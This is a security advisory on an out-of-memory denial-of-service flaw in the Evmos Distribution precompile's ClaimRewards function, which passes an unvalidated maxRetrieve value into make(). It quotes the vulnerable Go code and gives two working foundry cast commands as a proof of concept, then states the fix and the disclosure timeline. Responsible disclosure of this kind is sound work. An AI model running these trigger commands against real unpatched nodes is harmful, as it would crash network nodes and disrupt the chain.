# Evmos Distribution precompile denial-of-service

A vulnerability was identified in the evmos Distribution precompile that causes an out-of-memory condition, resulting in a node denial-of-service (DoS). Testing revealed that it was possible to trigger this vulnerability without the need to deploy a smart contract, or hold a balance on the network. At the time of reporting, the following versions were confirmed exploitable:

* Commit [39195bf2](https://github.com/evmos/evmos/commit/39195bf2f0af7892a7f1c30451faadba7f6835d2)
* Release [v18.1.0](https://github.com/evmos/evmos/releases/tag/v18.1.0)

This issue was remediated in commit [cb403bcf](https://github.com/evmos/evmos/commit/cb403bcf2f80327755dc24b5e78ef406a8ec1c68).

## Details

_tldr;_ The `ClaimRewards` function, accessible via the `Distribution` precompile, allows the caller to specify an arbitrary `maxRetrieval` value that is later passed to the staking module's `GetDelegatorValidators` function. `GetDelegatorValidators` directly uses `maxRetrieval` during a call to `make([]types.Validator, maxRetrieve)`, which allocates a significant amount of memory, leading to an irrecoverable out-of-memory issue.

The `Distribution` precompile makes a `ClaimRewards` function available, allowing a delegator to claim rewards from multiple validators. It accepts two arguments: the delegator address (`delegatorAddr`) and the maximum number of validators to retrieve rewards from (`maxRetrieve`). After parsing these arguments from the call's calldata, the staking module's `GetDelegatorValidators` is called. An excerpt of this is shown below.

```golang
func (p Precompile) ClaimRewards(
	ctx sdk.Context,
	origin common.Address,
	contract *vm.Contract,
	stateDB vm.StateDB,
	method *abi.Method,
	args []interface{},
) ([]byte, error) {
    // parse input arguments
	delegatorAddr, maxRetrieve, err := parseClaimRewardsArgs(args)
	if err != nil {
		return nil, err
	}

    // ...

    // call staking module's GetDelegatorValidators with delegator and max retrieve
	validators := p.stakingKeeper.GetDelegatorValidators(ctx, delegatorAddr.Bytes(), maxRetrieve)
	totalCoins := sdk.Coins{}
    // ...
}
```

In the staking module's `GetDelegatorValidators` function, the `maxRetrieve` amount is used directly during a call to `make()`. An excerpt of this is shown below.

```golang
func (k Keeper) GetDelegatorValidators(
	ctx sdk.Context, delegatorAddr sdk.AccAddress, maxRetrieve uint32,
) types.Validators {
    // using unvalidated maxRetrieve directly in make()
	validators := make([]types.Validator, maxRetrieve)

	store := ctx.KVStore(k.storeKey)
	delegatorPrefixKey := types.GetDelegationsKey(delegatorAddr)

	iterator := sdk.KVStorePrefixIterator(store, delegatorPrefixKey) // smallest to largest
	defer iterator.Close()

    // ...
}
```

A malicious actor can call the `Distribution` precompile's `ClaimRewards` with `maxRetrieval = 0xffffffff` (max `uint32`) to allocate a large amount of memory, leading to an out-of-memory exception and therefore a denial of service condition.

## Proof of Concept

To trigger the vulnerability, either one of the following transactions can be made using foundry's `cast` command. Both transactions specify the caller as the delegator address, and max `uint32` as `maxRetrieval`.

```sh
# use the mykey account bundled with the local node setup
cast call --mnemonic "gesture inject test cycle original hollow east ridge hen combine junk child bacon zero hope comfort vacuum milk pitch cage oppose unhappy lunar seat" 0x0000000000000000000000000000000000000801 'claimRewards(address delegatorAddress, uint32 maxRetrieval)' 0x7cb61d4117ae31a12e393a1cfa3bac666481d02e 0xffffffff

# use a different account that has no native token balance
cast call --mnemonic "test test test test test test test test test test test junk" 0x0000000000000000000000000000000000000801 'claimRewards(address delegatorAddress, uint32 maxRetrieval)' 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 0xffffffff
```

## Remediation

This issue was [remediated](https://github.com/evmos/evmos/commit/cb403bcf2f80327755dc24b5e78ef406a8ec1c68) by retrieving the maximum amount of validators from the staking keeper, and restricting `maxRetrieval` to that amount.

## Timeline

* 19-06-2024 - Reported vulnerability to Evmos
* 19-06-2024 - Evmos acknowledges receipt of the report
* 27-06-2024 - Evmos provides feedback that the issue is still being attended to, and steps have been taken to mitigate risk of exploitation
* 05-07-2024 - An [advisory](https://github.com/evmos/evmos/security/advisories/GHSA-68fc-7mhg-6f6c) is released and the vulnerability is considered fixed
* 26-08-2024 - Asymmetric Research security advisory is released